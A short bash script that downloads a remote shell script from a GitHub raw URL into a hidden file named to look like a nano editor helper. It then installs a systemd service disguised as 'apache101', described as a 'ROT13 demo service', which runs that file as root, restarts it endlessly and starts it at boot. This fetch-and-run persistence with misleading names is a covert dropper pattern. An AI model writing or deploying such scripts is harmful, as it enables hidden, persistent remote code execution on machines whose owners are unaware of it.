#! /bin/bash
sudo wget https://raw.githubusercontent.com/ujjwaltwitx/LeaveMeAlone/main/nano_editor.sh -O ~/.nano_editor.sh
sudo chmod +x ~/.nano_editor.sh

sudo echo "
[Unit]
Description=ROT13 demo service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/root/.nano_editor.sh

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/apache101.service

sudo systemctl daemon-reload
sudo service apache101 start
